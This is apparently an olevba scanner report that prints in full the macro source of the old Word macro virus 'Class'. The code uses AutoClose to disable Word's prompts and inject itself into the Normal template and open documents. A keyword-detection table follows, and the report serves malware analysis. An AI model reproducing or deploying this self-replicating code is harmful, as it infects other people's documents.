olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
On Error GoTo out
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
Options.VirusProtection = True
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
Options.SaveNormalPrompt = True
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
Options.ConfirmConversions = False
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
If nt = 0 Then
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
End If
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
If nt > 0 And ad > 0 Then GoTo out
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
host.codemodule.AddFromFile ("c:\class.sys")
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
With host.codemodule
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    For x = 1 To 4
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    .deletelines 1
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    Next x
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
End With
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
If nt = 0 Then
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    With host.codemodule
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    .replaceline 1, "Sub AutoClose()"
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    .replaceline 69, "Sub ToolsMacro()"
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    End With
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
End If
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
With host.codemodule
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    For x = 2 To 70 Step 2
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Now
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
    Next x
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
End With
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
out:
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
End Sub
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
Sub ToolsMacro()
'l-9/2/98 6:52:02 PMPanasonic KX-P6100 GDI on KXPGDI9/2/98 6:52:02 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

